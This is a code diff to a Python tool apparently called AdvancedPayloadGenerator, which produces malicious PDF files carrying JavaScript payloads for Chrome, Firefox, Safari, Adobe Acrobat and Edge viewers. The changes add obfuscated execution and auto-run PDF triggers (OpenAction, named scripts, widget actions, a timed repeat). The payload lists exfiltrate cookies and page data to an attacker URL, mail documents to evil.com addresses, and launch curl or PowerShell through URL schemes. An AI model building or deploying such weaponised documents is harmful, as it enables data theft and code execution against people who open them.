@@ -286,7 +286,8 @@ class AdvancedPayloadGenerator:
         if method == 'base64':
             import base64
             encoded = base64.b64encode(payload.encode()).decode()
-            return f"eval(atob('{encoded}'))"
+            # Use direct execution instead of eval(atob()) for better PDF compatibility
+            return f"(function(){{ try {{ var decoded = atob('{encoded}'); (new Function(decoded))(); }} catch(e) {{ {payload} }} }})();"
         elif method == 'unicode':
             return ''.join(f'\\u{ord(c):04x}' for c in payload)
         elif method == 'hex':
@@ -316,7 +317,7 @@ class AdvancedPayloadGenerator:
                 if j >= 3:  # Limit to 3 obfuscation variants per base
                     break
                     
-                payload = base_payload.replace('TARGET_URL', self.target_url).replace('TARGET_HOST', self.target_host)
+                payload = base_payload.replace('{url}', self.target_url).replace('{host}', self.target_host)
                 
                 if obf_method:
                     payload = self.obfuscate_payload(payload, obf_method)
@@ -335,7 +336,7 @@ class AdvancedPayloadGenerator:
         # Category 2: File System Access (50 payloads)  
         for i, base_payload in enumerate(CHROME_FILE_EXPLOITS):
             for j in range(3):  # 3 variations per exploit
-                payload = base_payload.replace('TARGET_URL', self.target_url)
+                payload = base_payload.replace('{url}', self.target_url)
                 
                 payloads.append({
                     'id': self.generate_unique_id(),
@@ -351,7 +352,7 @@ class AdvancedPayloadGenerator:
         # Category 3: Command Execution (50 payloads)
         for i, base_payload in enumerate(CHROME_CMD_EXPLOITS):
             for j in range(3):
-                payload = base_payload.replace('TARGET_URL', self.target_url)
+                payload = base_payload.replace('{url}', self.target_url)
                 
                 payloads.append({
                     'id': self.generate_unique_id(),
@@ -367,7 +368,7 @@ class AdvancedPayloadGenerator:
         # Category 4: Sandbox Escape (50 payloads)
         for i, base_payload in enumerate(CHROME_SANDBOX_EXPLOITS):
             for j in range(3):
-                payload = base_payload.replace('TARGET_URL', self.target_url)
+                payload = base_payload.replace('{url}', self.target_url)
                 
                 payloads.append({
                     'id': self.generate_unique_id(),
@@ -389,7 +390,7 @@ class AdvancedPayloadGenerator:
         # Category 1: DOM Access and CSP Bypass (70 payloads)
         for i, base_payload in enumerate(FIREFOX_DOM_EXPLOITS):
             for j in range(4):  # 4 variations per base
-                payload = base_payload.replace('TARGET_URL', self.target_url).replace('TARGET_HOST', self.target_host)
+                payload = base_payload.replace('{url}', self.target_url).replace('{host}', self.target_host)
                 
                 obf_methods = ['base64', 'eval_alternatives', 'unicode', None]
                 obf_method = obf_methods[j]
@@ -410,7 +411,7 @@ class AdvancedPayloadGenerator:
         # Category 2: File System Access (65 payloads)
         for i, base_payload in enumerate(FIREFOX_FILE_EXPLOITS):
             for j in range(6):  # 6 variations per base
-                payload = base_payload.replace('TARGET_URL', self.target_url)
+                payload = base_payload.replace('{url}', self.target_url)
                 
                 payloads.append({
                     'id': self.generate_unique_id(),
@@ -425,16 +426,16 @@ class AdvancedPayloadGenerator:
         
         # Category 3: Network Exfiltration (65 payloads)
         network_payloads = [
-            "try { fetch('TARGET_URL', {method: 'POST', body: navigator.userAgent + '|' + location.href}); } catch(e) { }",
-            "try { new XMLHttpRequest().open('GET', 'TARGET_URL?firefox=' + btoa(document.cookie)); } catch(e) { }",
-            "try { navigator.sendBeacon('TARGET_URL', JSON.stringify({type: 'firefox', data: location.href})); } catch(e) { }",
-            "try { WebSocket('TARGET_URL').send('Firefox PDF.js exploit'); } catch(e) { }",
-            "try { EventSource('TARGET_URL?stream=1'); } catch(e) { }",
+            "try { fetch('{url}', {method: 'POST', body: navigator.userAgent + '|' + location.href}); } catch(e) { }",
+            "try { new XMLHttpRequest().open('GET', '{url}?firefox=' + btoa(document.cookie)); } catch(e) { }",
+            "try { navigator.sendBeacon('{url}', JSON.stringify({type: 'firefox', data: location.href})); } catch(e) { }",
+            "try { WebSocket('{url}').send('Firefox PDF.js exploit'); } catch(e) { }",
+            "try { EventSource('{url}?stream=1'); } catch(e) { }",
         ]
         
         for i, base_payload in enumerate(network_payloads):
             for j in range(13):  # 13 variations per base = 65 total
-                payload = base_payload.replace('TARGET_URL', self.target_url)
+                payload = base_payload.replace('{url}', self.target_url)
                 
                 payloads.append({
                     'id': self.generate_unique_id(),
@@ -456,23 +457,23 @@ class AdvancedPayloadGenerator:
         # Safari/macOS specific exploits
         safari_exploits = [
             # WebKit integration exploits
-            "try { webkit.messageHandlers.exploit.postMessage('TARGET_URL'); } catch(e) { }",
-            "try { window.webkit.messageHandlers.preview.postMessage({action: 'navigate', url: 'TARGET_URL'}); } catch(e) { }",
+            "try { webkit.messageHandlers.exploit.postMessage('{url}'); } catch(e) { }",
+            "try { window.webkit.messageHandlers.preview.postMessage({action: 'navigate', url: '{url}'}); } catch(e) { }",
             
             # macOS specific features
-            "app.launchURL('osascript://tell%20application%20\"Safari\"%20to%20open%20location%20\"TARGET_URL\"', true);",
-            "app.launchURL('x-apple.systempreferences:com.apple.preference.security?url=TARGET_URL', true);",
-            "app.launchURL('x-apple-findmy://item?id=exploit&url=TARGET_URL', true);",
+            "app.launchURL('osascript://tell%20application%20\"Safari\"%20to%20open%20location%20\"{url}\"', true);",
+            "app.launchURL('x-apple.systempreferences:com.apple.preference.security?url={url}', true);",
+            "app.launchURL('x-apple-findmy://item?id=exploit&url={url}', true);",
             
             # PDFKit specific
-            "try { window.PDFKitView.goToURL('TARGET_URL'); } catch(e) { }",
-            "try { if(window.PDFView) PDFView.setURL('TARGET_URL'); } catch(e) { }",
+            "try { window.PDFKitView.goToURL('{url}'); } catch(e) { }",
+            "try { if(window.PDFView) PDFView.setURL('{url}'); } catch(e) { }",
             
             # Core Foundation abuse
-            "try { CFURLCreateWithString('TARGET_URL'); location = 'TARGET_URL'; } catch(e) { }",
+            "try { CFURLCreateWithString('{url}'); location = '{url}'; } catch(e) { }",
             
             # Objective-C runtime exploitation
-            "try { objc_msgSend('NSWorkspace', 'openURL:', 'TARGET_URL'); } catch(e) { }",
+            "try { objc_msgSend('NSWorkspace', 'openURL:', '{url}'); } catch(e) { }",
             
             # macOS file system
             "app.launchURL('file:///Applications/Calculator.app', true);",
@@ -480,21 +481,21 @@ class AdvancedPayloadGenerator:
             "app.launchURL('file:///usr/bin/open', true);",
             
             # Keychain exploitation
-            "try { Security.SecKeychainCopyDefault(); location = 'TARGET_URL'; } catch(e) { }",
+            "try { Security.SecKeychainCopyDefault(); location = '{url}'; } catch(e) { }",
             
             # AppleScript injection
-            "app.launchURL('osascript://do%20shell%20script%20\"curl%20TARGET_URL\"', true);",
+            "app.launchURL('osascript://do%20shell%20script%20\"curl%20{url}\"', true);",
             
             # Safari extensions
-            "try { safari.extension.dispatchMessage('exploit', {url: 'TARGET_URL'}); } catch(e) { }",
+            "try { safari.extension.dispatchMessage('exploit', {url: '{url}'}); } catch(e) { }",
             
             # WebKit process communication
-            "try { window.webkit.messageHandlers.contentWorlds.postMessage('TARGET_URL'); } catch(e) { }",
+            "try { window.webkit.messageHandlers.contentWorlds.postMessage('{url}'); } catch(e) { }",
         ]
         
         for i, base_payload in enumerate(safari_exploits):
             for j in range(13):  # 13+ variations each to reach 200
-                payload = base_payload.replace('TARGET_URL', self.target_url)
+                payload = base_payload.replace('{url}', self.target_url)
                 
                 obf_methods = ['base64', 'unicode', 'hex', None]
                 obf_method = obf_methods[j % len(obf_methods)]
@@ -521,54 +522,54 @@ class AdvancedPayloadGenerator:
         # Adobe has the richest JavaScript API - 250 payloads
         adobe_exploits = [
             # Full Acrobat JavaScript API exploitation
-            "app.launchURL('TARGET_URL', true);",
-            "this.submitForm({cURL: 'TARGET_URL', cSubmitAs: 'HTML'});",
-            "app.response({cQuestion: 'Enter password:', cTitle: 'Security Check', bPassword: true, cResponse: 'TARGET_URL'});",
-            "this.exportAsText({cPath: 'TARGET_URL'});",
-            "this.saveAs({cPath: 'TARGET_URL'});",
-            "app.browseForDoc({bSave: true, cFilenameEdit: 'TARGET_URL'});",
-            "this.print({bUI: false, bSilent: true, bShrinkToFit: true, cPath: 'TARGET_URL'});",
-            "app.execDialog({cName: 'ADBE:Capture_Bookmarks', oParams: {cURL: 'TARGET_URL'}});",
+            "app.launchURL('{url}', true);",
+            "this.submitForm({cURL: '{url}', cSubmitAs: 'HTML'});",
+            "app.response({cQuestion: 'Enter password:', cTitle: 'Security Check', bPassword: true, cResponse: '{url}'});",
+            "this.exportAsText({cPath: '{url}'});",
+            "this.saveAs({cPath: '{url}'});",
+            "app.browseForDoc({bSave: true, cFilenameEdit: '{url}'});",
+            "this.print({bUI: false, bSilent: true, bShrinkToFit: true, cPath: '{url}'});",
+            "app.execDialog({cName: 'ADBE:Capture_Bookmarks', oParams: {cURL: '{url}'}});",
             
             # Network and HTTP exploitation
-            "Net.HTTP.request({cURL: 'TARGET_URL', cMethod: 'POST', cParams: document.URL});",
-            "Net.HTTP.request({cURL: 'TARGET_URL', oHandler: {response: function(msg) {app.alert(msg);}}});",
+            "Net.HTTP.request({cURL: '{url}', cMethod: 'POST', cParams: document.URL});",
+            "Net.HTTP.request({cURL: '{url}', oHandler: {response: function(msg) {app.alert(msg);}}});",
             
             # Email and communication
-            "this.mailDoc({bUI: false, cTo: 'admin@evil.com', cSubject: 'PDF Exploit', cMsg: 'TARGET_URL'});",
+            "this.mailDoc({bUI: false, cTo: 'admin@evil.com', cSubject: 'PDF Exploit', cMsg: '{url}'});",
             "app.mailMsg({bUI: false, cTo: 'data@evil.com', cSubject: 'Exfiltrated', cMsg: this.URL});",
             
             # Database connectivity  
-            "ADBC.newConnection({cDSN: 'exploit', cUID: 'admin', cPWD: 'password', cURL: 'TARGET_URL'});",
+            "ADBC.newConnection({cDSN: 'exploit', cUID: 'admin', cPWD: 'password', cURL: '{url}'});",
             
             # File system manipulation
-            "util.readFileIntoStream('TARGET_URL');",
-            "app.openDoc('TARGET_URL');",
-            "app.execMenuItem('SaveAs', 'TARGET_URL');",
+            "util.readFileIntoStream('{url}');",
+            "app.openDoc('{url}');",
+            "app.execMenuItem('SaveAs', '{url}');",
             
             # Document manipulation
-            "this.getURL('TARGET_URL');",
-            "this.gotoNamedDest('TARGET_URL');",
-            "this.importIcon('TARGET_URL');",
-            "this.importSound('TARGET_URL');",
-            "this.importDataObject('TARGET_URL');",
+            "this.getURL('{url}');",
+            "this.gotoNamedDest('{url}');",
+            "this.importIcon('{url}');",
+            "this.importSound('{url}');",
+            "this.importDataObject('{url}');",
             
             # Security bypass
             "security.removeHandler({cName: 'Adobe.PPKLite'});",
-            "app.trustPropagatorFunction(function() {app.launchURL('TARGET_URL');});",
+            "app.trustPropagatorFunction(function() {app.launchURL('{url}');});",
             
             # Timer and automation
-            "app.setInterval('app.launchURL(\\'TARGET_URL\\')', 5000);",
-            "app.setTimeOut('this.submitForm({cURL: \\'TARGET_URL\\'})', 1000);",
+            "app.setInterval('app.launchURL(\\'{url}\\')', 5000);",
+            "app.setTimeOut('this.submitForm({cURL: \\'{url}\\'})', 1000);",
             
             # Advanced exploitation
-            "this.hostContainer.postMessage(['TARGET_URL'], '*');",
-            "app.beginPriv(); app.launchURL('TARGET_URL'); app.endPriv();",
+            "this.hostContainer.postMessage(['{url}'], '*');",
+            "app.beginPriv(); app.launchURL('{url}'); app.endPriv();",
         ]
         
         for i, base_payload in enumerate(adobe_exploits):
             for j in range(10):  # 10 variations each to reach 250+
-                payload = base_payload.replace('TARGET_URL', self.target_url)
+                payload = base_payload.replace('{url}', self.target_url)
                 
                 payloads.append({
                     'id': self.generate_unique_id(),
@@ -590,41 +591,41 @@ class AdvancedPayloadGenerator:
         # Edge/Windows specific exploits
         edge_exploits = [
             # Edge PDF viewer specific
-            "window.chrome.webview.postMessage('TARGET_URL');",
-            "window.external.notify('TARGET_URL');",
-            "msWebViewSettings.isGeneralAutofillEnabled = true; location = 'TARGET_URL';",
+            "window.chrome.webview.postMessage('{url}');",
+            "window.external.notify('{url}');",
+            "msWebViewSettings.isGeneralAutofillEnabled = true; location = '{url}';",
             
             # Windows integration
-            "app.launchURL('ms-settings:privacy-webcam?url=TARGET_URL', true);",
-            "app.launchURL('ms-availablenetworks:?target=TARGET_URL', true);",
-            "app.launchURL('ms-settings-power:?exploit=TARGET_URL', true);",
-            "app.launchURL('shell:AppsFolder?url=TARGET_URL', true);",
+            "app.launchURL('ms-settings:privacy-webcam?url={url}', true);",
+            "app.launchURL('ms-availablenetworks:?target={url}', true);",
+            "app.launchURL('ms-settings-power:?exploit={url}', true);",
+            "app.launchURL('shell:AppsFolder?url={url}', true);",
             
             # Registry manipulation
-            "app.launchURL('regedit://HKEY_CURRENT_USER/Software/Microsoft/Edge?url=TARGET_URL', true);",
+            "app.launchURL('regedit://HKEY_CURRENT_USER/Software/Microsoft/Edge?url={url}', true);",
             
             # PowerShell exploitation
-            "app.launchURL('powershell://Invoke-WebRequest -Uri TARGET_URL', true);",
-            "app.launchURL('cmd://curl TARGET_URL', true);",
+            "app.launchURL('powershell://Invoke-WebRequest -Uri {url}', true);",
+            "app.launchURL('cmd://curl {url}', true);",
             
             # Windows Store apps
-            "app.launchURL('ms-windows-store://pdp/?ProductId=exploit&url=TARGET_URL', true);",
+            "app.launchURL('ms-windows-store://pdp/?ProductId=exploit&url={url}', true);",
             
             # Chakra JavaScript engine
-            "try { ChakraHost.print('TARGET_URL'); } catch(e) { }",
+            "try { ChakraHost.print('{url}'); } catch(e) { }",
             
             # Edge extension API
-            "try { browser.tabs.create({url: 'TARGET_URL'}); } catch(e) { }",
-            "try { chrome.runtime.sendMessage({action: 'navigate', url: 'TARGET_URL'}); } catch(e) { }",
+            "try { browser.tabs.create({url: '{url}'}); } catch(e) { }",
+            "try { chrome.runtime.sendMessage({action: 'navigate', url: '{url}'}); } catch(e) { }",
             
             # Windows file system
-            "app.launchURL('file:///C:/Windows/System32/calc.exe?url=TARGET_URL', true);",
-            "app.launchURL('file:///C:/Users/Public/Documents/?target=TARGET_URL', true);",
+            "app.launchURL('file:///C:/Windows/System32/calc.exe?url={url}', true);",
+            "app.launchURL('file:///C:/Users/Public/Documents/?target={url}', true);",
         ]
         
         for i, base_payload in enumerate(edge_exploits):
             for j in range(10):  # 10 variations each to reach 150
-                payload = base_payload.replace('TARGET_URL', self.target_url)
+                payload = base_payload.replace('{url}', self.target_url)
                 
                 payloads.append({
                     'id': self.generate_unique_id(),
@@ -1038,20 +1039,23 @@ startxref
 %%EOF'''
 
     else:
-        # Generic structure for Chrome, Edge and others
-        pdf_content = f'''%PDF-1.6
+        # Enhanced generic structure for Chrome, Edge and others with sophisticated features
+        pdf_content = f'''%PDF-1.7
 1 0 obj
 <<
 /Type /Catalog
 /Pages 2 0 R
 /OpenAction 3 0 R
+/AcroForm 4 0 R
+/Names 5 0 R
+/JavaScript 6 0 R
 >>
 endobj
 
 2 0 obj
 <<
 /Type /Pages
-/Kids [4 0 R]
+/Kids [7 0 R]
 /Count 1
 >>
 endobj
@@ -1066,16 +1070,82 @@ endobj
 
 4 0 obj
 <<
-/Type /Page
-/Parent 2 0 R
-/MediaBox [0 0 612 792]
-/Contents 5 0 R
+/Fields [8 0 R]
+/DA (/Helv 0 Tf 0 g)
+/DR 9 0 R
 >>
 endobj
 
 5 0 obj
 <<
-/Length 45
+/JavaScript 10 0 R
+>>
+endobj
+
+6 0 obj
+<<
+/Names [(init) 11 0 R (exploit) 12 0 R (persistent) 13 0 R]
+>>
+endobj
+
+7 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 14 0 R
+/Annots [8 0 R]
+/AA 15 0 R
+/Resources 9 0 R
+>>
+endobj
+
+8 0 obj
+<<
+/Type /Annot
+/Subtype /Widget
+/Rect [100 100 200 150]
+/AA 16 0 R
+/T (ExploitField)
+>>
+endobj
+
+9 0 obj
+<<
+/Font 17 0 R
+>>
+endobj
+
+10 0 obj
+<<
+/Names [(payload) 18 0 R (secondary) 19 0 R]
+>>
+endobj
+
+11 0 obj
+<<
+/S /JavaScript
+/JS ({payload})
+>>
+endobj
+
+12 0 obj
+<<
+/S /JavaScript  
+/JS ({payload})
+>>
+endobj
+
+13 0 obj
+<<
+/S /JavaScript
+/JS (app.setTimeOut('({payload})', 1000);)
+>>
+endobj
+
+14 0 obj
+<<
+/Length 55
 >>
 stream
 BT
@@ -1086,21 +1156,81 @@ ET
 endstream
 endobj
 
+15 0 obj
+<<
+/O 3 0 R
+/C 3 0 R
+>>
+endobj
+
+16 0 obj
+<<
+/E 3 0 R
+/X 3 0 R
+/D 3 0 R
+/U 3 0 R
+/Fo 3 0 R
+>>
+endobj
+
+17 0 obj
+<<
+/F1 20 0 R
+>>
+endobj
+
+18 0 obj
+<<
+/S /JavaScript
+/JS ({payload})
+>>
+endobj
+
+19 0 obj
+<<
+/S /JavaScript
+/JS (try {{ {payload} }} catch(e) {{ app.launchURL('data:text/html,<script>{payload}</script>'); }})
+>>
+endobj
+
+20 0 obj
+<<
+/Type /Font
+/Subtype /Type1
+/BaseFont /Helvetica
+>>
+endobj
+
 xref
-0 6
+0 21
 0000000000 65535 f 
 0000000009 00000 n 
-0000000074 00000 n 
-0000000131 00000 n 
-0000000195 00000 n 
-0000000283 00000 n 
+0000000147 00000 n 
+0000000204 00000 n 
+0000000268 00000 n 
+0000000329 00000 n 
+0000000362 00000 n 
+0000000439 00000 n 
+0000000563 00000 n 
+0000000647 00000 n 
+0000000675 00000 n 
+0000000734 00000 n 
+0000000791 00000 n 
+0000000848 00000 n 
+0000000920 00000 n 
+0000001026 00000 n 
+0000001060 00000 n 
+0000001112 00000 n 
+0000001140 00000 n 
+0000001197 00000 n 
+0000001304 00000 n 
 trailer
 <<
-/Size 6
+/Size 21
 /Root 1 0 R
 >>
 startxref
-379
+1386
 %%EOF'''
 
     with open(filename, 'w') as f:
